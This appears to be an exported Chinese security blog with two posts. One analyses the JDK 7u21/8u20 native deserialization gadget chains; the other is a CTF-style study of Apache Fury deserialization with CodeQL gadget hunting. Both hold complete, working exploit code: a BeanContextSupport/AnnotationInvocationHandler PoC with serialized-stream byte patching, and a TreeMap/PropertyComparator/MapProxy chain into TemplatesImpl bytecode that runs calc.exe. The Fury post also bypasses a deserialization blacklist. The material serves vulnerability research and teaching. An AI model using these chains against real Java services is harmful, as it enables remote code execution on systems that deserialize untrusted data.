很明白了吧\n[*] 值2 当然这里值肯定不止f5a5a608一个，但是呢我可能想不到溢出但是我肯定会想到\u0026quot;\u0026quot;空值\n我们看到String的hash默认是为0的\n再看String的hashCode()代码，是不是只有不进入这个if，即可得到hash为0的字符串了呢\n也就是让length\u0026lt;=0即可，即\u0026quot;\u0026quot;.hashCode()，验证可行hh\n然后其实这里equals的触发，CC7的map我觉得也完全没问题，感兴趣可以看看我CC7的几种绕过hash相等的问题\nput点 还有一个关于put顺序的poc设计吧，也是类似CC链的。\nmap这个值存放到AnnotationInvocationHandler.this.memberValues用于hash的运算\n然后这里map没有直接存TemplatesImpl对象，因为下方LinkedHashSet#add会触发map#put-\u0026gt;hash的检测——\u0026gt;触发equals调用-\u0026gt;触发sink报错中断\n所以这里等LinkedHashSet#add完，再put覆盖成对应的TemplatesImpl对象，其他应该没啥说的了这条链子\n7u21的修复 对我们type进行了类型限制，导致我们将type设置成Templates.class时会throw错误中断我们的反序列化，\njdk8u20 这里主要依靠的是@1nhann师傅那篇文章，不轻松捏\n针对7u21的绕过，主要利用两个特性\n双层try/catch TC_REFERENCE 双层try/catch 直接写看个demo吧，这里我们会发现里层try会throw错误，但是这个时候并不会直接中断程序，相当于里层try/catch都属于外层try的代码，所以这时应该跳转到外层的catch，而外层catch没有throw时后面的代码依然可以正常运行\n当然这里外层catch是throw的话，这个会返回bitch2\n还有一点外层catch的捕获类型要包含内层的throw，如果外层是IOException，内层是Exception，这时就会捕获不到，然后报错终端\npublic class error { public static void main(String[] args) throws Exception { try { try { int i = 1/0; }catch (Exception e){ throw new Exception(\u0026#34;bitch\u0026#34;); } }catch (Exception e){ // }catch (IOException e){ // throw new Exception(\u0026#34;bitch2\u0026#34;); ; } System.out.println(\u0026#34;fuck\u0026#34;); } } 而AnnotationInvocationHandler#readObject中是先就执行了s.defaultReadObject();再对type进行的判断\n这样也就是，进行type判断后的代码，我其实并不需要（gadget不用后面的调用），我只需要AnnotationInvocationHandler对象而已，所以这里靠双层try/catch能让AnnotationInvocationHandler还原对象即可，type后面的代码执行不了也无所谓\n所以gadget中如果有代码能满足这个一个例子，是不是就能让AnnotationInvocationHandler#readObject不中断程序了呢\n{ try{ os.readObject(); //这个进行AnnotationInvocationHandler#readObject } catch (Exception e){ ; //然后会跳转到这行来，只要不是什么强制退出的代码是不是就能用了呢 } } 然后还有一点要考虑，就是段代码要能被我们gadget调用且能控制os值为我们AnnotationInvocationHandler序列化数据\n这里java.beans.beancontext.BeanContextSupport 就刚好满足我们的条件，这个类的 readObject() ，调用了 readChildren(ois);下图其代码中可以看到catch是满足条件的\nprivate synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable \u0026gt; 0 \u0026amp;\u0026amp; this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } TC_REFERENCE 这个简单说就是，java序列化/反序列化对每个对象产生时都设置了一个Handler值(类似索引)，而你第二次调用同一个对象时，java会直接通过这个Handler值找到第一次生成的对象进行调用\n还是通过demo说下吧（这个特性绕过fastjson原生链那个是同一个）懒，demo也是直接copy的，别喷\nimport ysoserial.Serializer; import java.io.File; import java.io.FileOutputStream; public class Test { public static void main(String[] args) throws Exception{ Fuck f = new Fuck(); Object[] l = {f,f}; byte[] ser = Serializer.serialize(l); writeFile(ser,\u0026#34;1.txt\u0026#34;); } public static void writeFile(byte[] content,String path) throws Exception{ File file = new File(path); FileOutputStream f = new FileOutputStream(file); f.write(content); f.close(); } } 就这里不是有2个f么，都调用的同一个对象，这里序列化时，只会给第一个f完整的序列化，而第二个f则存储第一个f的Handler，而反序列化时，也是先反序列化第一个f，到第二个f还原对象时，直接把第一个f的对象给他\n关于Handler的一个小知识，序列化数据里面 第一个Handler值都是 @Handler - 8257536 (0x7E0000)，然后每新产生一个Handler，值+1，第二个Handler就为8257537\n利用思路 然后说了这么多到底怎么利用呢？\n还记得7u21我们用的LinkedHashSet传了一个值，后面hash碰撞\n我们让BeanContextSupport包裹AnnotationInvocationHandler然后放在第一位//用于还原AnnotationInvocationHandler对象 TemplatesImpl放第二位，和7u21一样用于hash的碰撞 Proxy放第三位，其中代理类和我们BeanContextSupport包裹的是同一个对象就行了 这样会先反序列化BeanContextSupport对象，就会把AnnotationInvocationHandler还原了。然后proxy利用时直接通过Handler调用还原了的AnnotationInvocationHandler对象（后面就和7u21一样了\npoc 报错 前言：跳跳糖那篇文章很好，但是关于最后那个报错问题我觉得光看那篇文章肯定是搞不明白的以及为什么删那两个数据，为什么不能添加呢？为什么删除了数据会不出乱子而可以正常利用呢？其实都没交代（至少在我的视角下是这样的，也可能是我菜!^!），然后笔者下面记录的光看肯定也是理解不了，要自己找到对应点调试和对应序列化数据才能体会其中的真意\n直接copy的poc，然后也很好理解吧，但是又产生了一个新的报错！！！（为了搞明白这个报错也是花费了一些时间）\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.Gadgets; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class Poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\u0026#34;calc.exe\u0026#34;); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,new HashMap\u0026lt;\u0026gt;()); Reflections.setFieldValue(ih,\u0026#34;type\u0026#34;, Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\u0026#34;serializable\u0026#34;,1); HashMap tmpMap = new HashMap\u0026lt;\u0026gt;(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\u0026#34;children\u0026#34;,tmpMap); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\u0026#34;f5a5a608\u0026#34;,templates); Reflections.setFieldValue(ih,\u0026#34;memberValues\u0026#34;,hm); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } 然后运行会产生一个因为readInt()的报错，而这个报错归功于AnnotationInvocationHandler\nException in thread \u0026#34;main\u0026#34; java.io.EOFException at java.io.DataInputStream.readInt(DataInputStream.java:392) at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823) 一直调试跟踪到readBlockHeader()这里return -1;导致的in.read()为-1 ，然后进入throw\n跟踪发现你的类重写readObject然后调用defaultReadObject()，反序列化就会进入下方代码，而defaultDataEnd这个值则跟该类有没有writeObject()有关，没有的话这里就会给defaultDataEnd = true，然后这就是导致上方报错的根本原因吗？？？No\n其实这只是其中一个原因（或者说不是根本原因），如果BeanContextSupport存一个对象，就因为这个对象的类没有writeObject()就报错，是不是有点太蠢了呀。于是写了个demo\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import java.beans.beancontext.BeanContextSupport; import java.util.HashMap; import java.util.LinkedHashSet; public class serSupport { public static void main(String[] args) throws Exception { Test2 test = new Test2(); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\u0026#34;serializable\u0026#34;,1); HashMap tmpMap = new HashMap\u0026lt;\u0026gt;(); tmpMap.put(test,null); Reflections.setFieldValue(b,\u0026#34;children\u0026#34;,tmpMap); String test2=\u0026#34;test2\u0026#34;; TemplatesImpl templates = new TemplatesImpl(); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(test2); set.add(templates); byte[] ser = Serializer.serialize(set); ReadWrite.writeFile(ser,\u0026#34;serobj.txt\u0026#34;); Deserializer.deserialize(ser); } } Test2\nimport ysoserial.Deserializer; import ysoserial.payloads.util.ReadWrite; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Test2 implements Serializable { public static void main(String[] args) throws Exception{ byte[] bytes = ReadWrite.readFile(\u0026#34;ser+.txt\u0026#34;); Deserializer.deserialize(bytes); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); } } 然后你会发现并没有报错，而且defaultDataEnd = true也赋值了的。先看看序列化数据吧，用zkar看的\n我先解释下这段数据位于啥地方，最外层是java.util.LinkedHashSet的[]ClassData，就是记录LinkedHashSet中每个属性对应的值，然后为啥单独拿这个地方来说呢，看3那个位置，这个对我们来说很重要，因为这里是报错产生的位置。\n然后没有看过序列化数据的师傅建议跟着这个思维导图看，还是挺建议看的，把每个值的注释含义以及完整看一个序列化数据基本上就都能看懂了。\n然后简单提一点吧@ObjectAnnotation在数据里面当时没看懂的，后面看到下图这个才理解，可以理解为序列化数据吧（刚开始看的时候困惑了下，这里也是简单提一下\n然后你会看序列化数据后，你肯定还关心一个点@ClassDescFlags，可以看到Test2是没有SC_WRITE_METHOD这个值，那他为什么没有报错捏？\n@ClassName @Length - 5 - 0x00 05 @Value - Test2 - 0x54 65 73 74 32 @SerialVersionUID - 6232696428067116234 - 0x56 7e fc 61 0b c9 54 ca @Handler - 8257558 @ClassDescFlags - SC_SERIALIZABLE - 0x02 回到正题 我们在赋值true后往后跟踪，\n发现Test2反序列化完成后，会把defaultDataEnd = false重新覆盖掉的。（所以没有writeObject()不是罪魁祸首）\n然后再反序列化null，再到反序列化count = ois.readInt();（在结合上面序列化数据分析的）过程是这样。readInt()结束后，也就意味着BeanContextSupport反序列化结束了，然后到下一个对象了String test2的反序列化了（这里为什么说这个，对后面理解是有用的\ndebug表达式\nString.format(\u0026#34;0x%02X\u0026#34;,(int)bin.in.in.buf[(int)bin.in.in.pos-1]) AnnotationInvocationHandler throw原因 那AnnotationInvocationHandler是什么原因呢自然是跟他readObject报错是有关系的。\n报错最后throw的是IOException的报错，然后下图2是捕获ClassNotFoundException报错的，所以这里不会进入catch，而是**走完finally（没能执行defaultDataEnd = false）继续跳转到上层throw**（这个步骤重复了几次），最后才被BeanContextSupport的catch捕获IOException\n于是这里又多了一层理解，及BeanContextSupportcatch能捕获的error要包含AnnotationInvocationHandler的throw才行而不只是满足双层try/catch结构\n原因小结 所以就是readObject报错导致退出了，从而没能让defaultDataEnd = false重新覆盖掉。导致readInt()报错。而添加SC_WRITE_METHOD只是我们利用的手段，不是原因\nbyte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); 所以这里我们把flags 0x02改成0x03（SC_WRITE_METHOD值是0x01所以这里+1），这里zkar看序列化数据报错了，可以用另一个工具替代下SerializationDumper\nC:\\TOOLS\\Java\\jdk-17\\bin\\java.exe -jar SerializationDumper-v1.14.jar -f C:\\Users\\26618\\Desktop\\Ljava\\jdk7u21-8u20\\ser+.txt 再次调试 从defaultDataEnd = true最后那个}那里开始吧，然后发现会一路throw到BeanContextSupportcatch continue;，直接退出了BeanContextSupport包裹类的反序列化，直接来到deserialize的ois.readInt();\n导致的问题 导致了个什么问题呢？\nmap的key是AnnotationInvocationHandler，而我们设置的map的value是null，这里AnnotationInvocationHandler反序列化完就中断了map的反序列化导致**null没有反序列化**，而程序直接来到了ois.readInt();，序列化数据in.in.pos却还在null值的位置，然后导致throw\n然而这个null并不影响我们利用，所以直接把这个值删掉就好\n这里再提一嘴null为什么删掉没事。以及为什么要删除\n还记得上面那个序列化数据图的分析么，下图这里是同一个位置含义差不多，这里调试对应的地方是TC_NULL,而int对应的是TC_BLOCKDATA，所以我们要让TC_BLOCKDATA提前，而为什么没影响呢，readInt()后其实就标志着BeanContextSupport反序列化的结束，然后紧接着要反序列化add的第二个对象了（下图是指向TemplatesImpl的Handler），所以这里不能添加值，只能删除值，因为添加值会对后面的反序列化照成影响，而删除TC_NULL能在前面完成闭环。\n最简洁poc 大功告成，我们没有直接给AnnotationInvocationHandler改写一个writeObject，所以可以直接一个文件就可以执行了\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ByteUtil; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk8u20_poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\u0026#34;calc.exe\u0026#34;); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).newInstance(Override.class, new HashMap\u0026lt;\u0026gt;()); Reflections.setFieldValue(ih,\u0026#34;type\u0026#34;, Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\u0026#34;serializable\u0026#34;,1); HashMap tmpMap = new HashMap\u0026lt;\u0026gt;(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\u0026#34;children\u0026#34;,tmpMap); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\u0026#34;f5a5a608\u0026#34;,templates); Reflections.setFieldValue(ih,\u0026#34;memberValues\u0026#34;,hm); byte[] ser = Serializer.serialize(set); byte[] nullReplace = new byte[]{0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71}; byte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); int j = ByteUtil.getSubarrayIndex(ser,nullReplace); ser = ByteUtil.deleteAt(ser,j); ReadWrite.writeFile(ser,\u0026#34;ser+.txt\u0026#34;); byte[] bytes = ReadWrite.readFile(\u0026#34;ser+.txt\u0026#34;); Deserializer.deserialize(bytes); } } 8u20修复 最后反射调用的方法只能是下面3个，导致不能调用sink点了\n后言：其实我记录的比较简单，关于导致的问题这里得经过调试以及查看序列化源码才能得出，我最开始是看参考文章以为就那么回事，然后我是打算补全那个int数据的，也就是填充数据，然后发生了报错，以及感觉到一些疑点吧。反正就始终说服不了自己，主要就是参考文章里面删除那两个数据，为什么呢，为什么呢？？我知道是对齐int，但是会不会对其他数据照成影响呢？然后就自己琢磨哇，也是搞得明明白白了很爽。然后调试找序列化数据里面对应的位置，可以通过前后pos的值去找\n参考\nhttps://tttang.com/archive/1729/#toc_\nhttps://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/","summary":"前言：最近缺少sink点，看看前辈们是怎么利用原生链的 然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度 jdk","title":"jdk7u21\u0026 8u20 深度分析"},{"content":" 前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得少hhh）\n这类非常规反序列化，就是查看他序列化和反序列化的逻辑，然后找可以利用的方法有哪些然后作为链子的开头（讲的有点笼统，下面来点实际的\n环境：用到aliyunctf-jtools的jar包，下载链接比赛官网应该还有\ncalc calc = new calc(); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;val\u0026#34;, calc); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(hashMap); Fury ser_fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build(); Object deserialize = ser_fury.deserialize(serialize); 这个是我最初的一个demo\n0x01 序列化\u0026amp;反序列化 逻辑 反序列化 直接看是怎么反序列化的吧，正常反序列化对象，会到这个default:中（调试到下图，前面的地方我就没记录，感觉记多了，文章挺臃肿，看得烦），然后调用每个对象的ClassInfo中设置的serializer#read方法进行还原这个对象，然后上面还有一些case 我简单看了没什么操作空间，都是还原一些常用类型（int什么的），而这个serializer是在序列化中设置的，那我们去看看序列化吧\n序列化 Fury有一个map存储了一些类的ClassInfo，这里类，序列化的时候会直接从这个map获取属于自己的ClassInfo\n然后看到有86对值，也就是有86个read方法可以查看相关的代码逻辑有没有可以利用的点（链子起点）\n当然除了map中记录之外的类，Fury也会生成serializer为其实现序列化\nthis.addSerializer(cls, this.createSerializer(cls)); 跟进this.createSerializer，然后一直到getSerializerClass()\n这里会对要序列化的class进行一些检测，然后在调用this.getObjectSerializerClass()获取Serializer的class，这里检测我主要关注了Serializable.class这个点，还有requireJavaSerialization()这个是因为里面有关于Serializable.class的判断，然后发现只要class不是以java开头即使没继承Serializable.class也可以被Fury反序列化，初步推断Fury是可以反序列化没继承Serializable.class的类\n然后跟this.getObjectSerializerClass()\n先会有一个checkNotInDisallowedList()黑名单检测，后面继续调试\n下面这个地方跟进去\n然后到下面这个classLoader.loadClass，为什么要跟这个地方等下就知道了\n0x02 动态生成的serializer classloader是ClassLoaderUtils$ByteArrayClassLoader来加载的，然后会到父类的loadClass方法，然后再到下图的findClass() 生成class\n他这个serializer是动态生成，到时候我们调试是调试不了其read()方法的，而这里我们可以得到其class的byte[]，下面后续的操作，就是通过加载byte[]生成class然后通过反射( newInstance() )得到serializer对象\n我们也可以通过这个byte[]生成class文件，查看其代码逻辑\nbyte[] bytes = {-54, -2, -70, -66, ...}; FileOutputStream fileOutputStream = new FileOutputStream(\u0026#34;test.class\u0026#34;); fileOutputStream.write(bytes); fileOutputStream.close(); 这里我是生成了一个TemplatesImpl.class的serializer（为什么选这个，因为经典纯牛奶）\n在调试那个黑名单检测时，运行下面这个就能绕过那个地方，然后生成我们的serializer\nDEFAULT_DISALLOWED_LIST_SET.map.remove(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;) 然后只有this.readAndSetFields里面逻辑能审计下，但是基本上也没看到什么反序列化后对方法的调用也可能是类没选对，但是那个(就是这个class怎么生成这些的，感兴趣的可以再深入分析分析)\n0x03 链子查找 回到之前的86个read方法，这里我其实想起了hessian反序列化的hashmap，然后我反序列化了一个hashmap\n看到下面这里，会先反序列化key和value，然后进行map.put，这里不就能进行利用了么（对象调用）\nhash,hashcode,equals都能利用了哇 然后我们在看到HashMapSerializer上面的上面是继承AbstractMapSerializer，其再继承Serializer\n86个read我总不能挨个去看吧，但是我们起点大致可以设置为继承Serializer的read方法\n思路 这里大致就两种吧\n通过read为起点，到sink点 通过read为起点，到jdk原生反序列化，readobject再到sink点 sink点 source点自然是继承Serializer的read方法\n起初是用tabby尝试找链子的，然后感觉tabby找得有点力不从心。然后去折腾ql了,也折腾了会吧。相对来说ql给我的感觉会复杂很多，然后自我感觉这篇文章后面内容不是很好，想着写一半了都，还是完个结吧\n先讲sink点吧，因为跟思路对应些，有点照着答案找链子的意思了（苦笑\n这里fury本身自带200+类的过滤，然后出题人又加了一个com.feilong.lib的过滤，所以也能往二次反序列化这个方向想吧\n那也就是先找readObject点了呗\nimport java // 定义 ObjectInputStream 及其子类类型 class OISFamily extends RefType { OISFamily() { this.hasQualifiedName(\u0026#34;java.io\u0026#34;, \u0026#34;ObjectInputStream\u0026#34;) or this.getASupertype+().hasQualifiedName(\u0026#34;java.io\u0026#34;, \u0026#34;ObjectInputStream\u0026#34;) } } // 查找所有调用 from MethodCall call, Method method where method.hasName(\u0026#34;readObject\u0026#34;) and method.getDeclaringType() instanceof OISFamily and call.getMethod() = method and not call.getEnclosingCallable().getDeclaringType().getQualifiedName().matches(\u0026#34;%com.feilong.lib%\u0026#34;) and call.getEnclosingCallable().getName()!=\u0026#34;readObject\u0026#34; select call, call.getEnclosingCallable().getName(),call.getEnclosingCallable().getDeclaringType().getQualifiedName() 看了下最有机会的是IoUtil和JavaSerializer吧，其他方法不太可能调用到\n然后就去看怎么调用到JavaSerializer，然后我又去把序列化和反序列化的流程又去看了篇，得出调用不了（不在map里，其他点也没发现能调用到的），估计是专门fury.register才行,用来提高兼容性的 感觉www。然后还去想了下能不能从序列化byte[]里面构造出JavaSerializer，让他反序列化去调用\n看了反序列化对byte[]的处理发现不行hh，他map中Serializer，在序列化byte[]里面会存一个索引，反序列化的时候直接去map调用对应索引得到对应的Serializer，而不是map中，会和序列化一样的步骤去newSerializer。所以也操作不了\n那就把点看到IoUtil，然后这里思路就应该先从read想办法往这个点调用了，直接查出来的有很多都是走clone()的。后面看有没有机会再说，先把wp的那条整了，这里一直往上找可以到AbstractConverter#convert\n我觉得ql不刻意写，应该还不能通过cb getter那个点(不只是getter)到get触发invoke再到convert吧\n这里就分为两段了，后面这段我就直接找invoke到convertInternal（这里result有很多，就直接先写的invoke的）\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ this.getDeclaringType().getASupertype*().hasQualifiedName(\u0026#34;java.lang.reflect\u0026#34;, \u0026#34;InvocationHandler\u0026#34;) and this.getName().matches(\u0026#34;invoke\u0026#34;) } } class LookupMethod extends Method { LookupMethod() { this.getName()=\u0026#34;convert\u0026#34; and this.getDeclaringType().getQualifiedName().matches(\u0026#34;cn.hutool.core.convert.AbstractConverter%\u0026#34;) } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) select source, source, sink, \u0026#34;$@ $@ to $@ $@\u0026#34; , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() 可以看到这里这条和wp中还挺符合的\nsource点 然后这里找到read到compare就没那么像的了\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ exists(Method m,Parameter p| m.hasName(\u0026#34;read\u0026#34;) and m.getDeclaringType().getASupertype*().getQualifiedName().matches(\u0026#34;org.apache.fury.serializer.Serializer%\u0026#34;) and exists(m.getAnOverride()) and p.getType().(RefType).hasQualifiedName(\u0026#34;org.apache.fury.memory\u0026#34;, \u0026#34;MemoryBuffer\u0026#34;) and p.getName() != \u0026#34;p0\u0026#34; and m = p.getCallable() and this = m ) } } class LookupMethod extends Method { LookupMethod() { exists(MethodCall a| a.getCallee().getName()=\u0026#34;getProperty\u0026#34; and this = a.getCaller() ) } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) and sink.getDeclaringType().getQualifiedName().matches(\u0026#34;com.feilong.core.util.comparator.PropertyComparator%\u0026#34;) select source, source, sink, \u0026#34;$@ $@ to $@ $@\u0026#34; , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() 可以看到是有偏差的，然后这里read方法有很多，其实很多可以排除，因为要调用到才行 \u0026amp; 能储存对象才行（比如map）这种，因为不能储存对象的话，你后续gadget也无法展开（因为你起点类最少要满足能还原一个对象，并使这个对象调用一个方法吧）。然后我看了大多结果，很多都可以排除掉，也就是可以去看他定义了的mapSerializer中有那些，然后看class类型进行筛选，然后对codeql source进行限制。然后还有很多read后面也是指向CollectionSerializer#read，所以这个点多少也会去研究下。\n然后正常思路肯定不会直接就找compare方法嘛（纯照答案找），思路的话我觉得\n可以有个sinkmethod集合，然后找这个集合（就是误报很多就是了hh） edges几层，然后看这几层里面有那些函数可以利用，但是这个误报就太太大了 然后这里compare不是没找到对应的链子，我去看了下jdk的类，codeql是怎么处理的，然后发现是调用的class文件，而且感觉节点也出了问题，比如siftUpUsingComparator这个方法就找不到。\nimport java from RefType queueType, Method m where m.getDeclaringType().getASupertype*().getQualifiedName().matches(\u0026#34;java.util.PriorityQueue%\u0026#34;) select m,m.getLocation().getFile().getAbsolutePath() 然后我去找个了jdk的源码一起加到数据库里，但是生成要很久，而且很卡（我是直接反编译，然后codeql database create db-name --language=java --source-root=./sources --build-mode=none，生成的）有好的方法，希望师傅们安利下hh（win10）\n生成之后原本的没找出来，treeMap的找出来，hhh。\n然后用treemap改了下开头是可以打的，构造有些小问题，防止生成的时候触发poc，也是用最暴力的反射解决了\npackage tostring_test; import cn.hutool.core.map.BiMap; import cn.hutool.core.map.MapProxy; import cn.hutool.core.util.ReflectUtil; import cn.hutool.core.util.SerializeUtil; import com.feilong.core.util.comparator.PropertyComparator; import com.feilong.lib.collection4.iterators.FilterIterator; import com.feilong.lib.digester3.ObjectCreationFactory; import com.google.common.collect.ArrayListMultimap; import com.google.common.collect.Multimap; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import org.apache.fury.Fury; import org.apache.fury.config.Language; import org.apache.fury.serializer.JavaSerializer; import java.lang.invoke.SerializedLambda; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import java.util.PriorityQueue; import java.util.TreeMap; import com.google.common.base.Predicate; public class compare_test { static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field declaredField = obj.getClass().getDeclaredField(fieldName); declaredField.setAccessible(true); declaredField.set(obj, value); } public static void main(String[] args) throws Exception, IllegalAccessException { byte[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;hello\u0026#34;); TemplatesImpl tmpl1 = new TemplatesImpl(); Field bytecodes1 = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes1.setAccessible(true); bytecodes1.set(tmpl1, new byte[][]{bytes}); Field name1 = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name1.setAccessible(true); name1.set(tmpl1, \u0026#34;hello2\u0026#34;); ///templates // String prop = \u0026#34;digester\u0026#34;; String prop = \u0026#34;digester\u0026#34;; PropertyComparator propertyComparator = new PropertyComparator(prop); Map TreeMap = new TreeMap(propertyComparator); Object templatesImpl1 = tmpl1; Object templatesImpl = tmpl; PropertyComparator propertyComparator1 = new PropertyComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1); ReflectUtil.setFieldValue(priorityQueue1, \u0026#34;size\u0026#34;, \u0026#34;2\u0026#34;); Object[] objectsjdk = {templatesImpl1, templatesImpl}; setFieldValue(priorityQueue1, \u0026#34;queue\u0026#34;, objectsjdk); /////jdk byte[] data = SerializeUtil.serialize(priorityQueue1); Map hashmap = new HashMap(); hashmap.put(prop, data); MapProxy mapProxy = new MapProxy(hashmap); ObjectCreationFactory test = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); ObjectCreationFactory test1 = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); TreeMap.put(test,1); // TreeMap.put(test1,2); // setFieldValue(TreeMap,\u0026#34;comparator\u0026#34;, propertyComparator); // TreeMap.put(1234,123); // TreeMap.put(1234,123); // root = new TreeMap.Entry\u0026lt;\u0026gt;(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;, null); Constructor\u0026lt;?\u0026gt; declaredConstructor = Class.forName(\u0026#34;java.util.TreeMap$Entry\u0026#34;).getDeclaredConstructors()[0]; declaredConstructor.setAccessible(true); Object root_test1 = declaredConstructor.newInstance( test1, 2, null); Field root = TreeMap.getClass().getDeclaredField(\u0026#34;root\u0026#34;); root.setAccessible(true); Object Troot = root.get(TreeMap); Field left = Troot.getClass().getDeclaredField(\u0026#34;right\u0026#34;); left.setAccessible(true); left.set(Troot, root_test1); root.set(TreeMap, Troot); setFieldValue(TreeMap,\u0026#34;size\u0026#34;,2); setFieldValue(TreeMap,\u0026#34;modCount\u0026#34;,2); // TreeMap.put(test1,1232); // BiMap hashMap = new BiMap(hashMap1); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(TreeMap); Object deserialize = fury.deserialize(serialize); } } 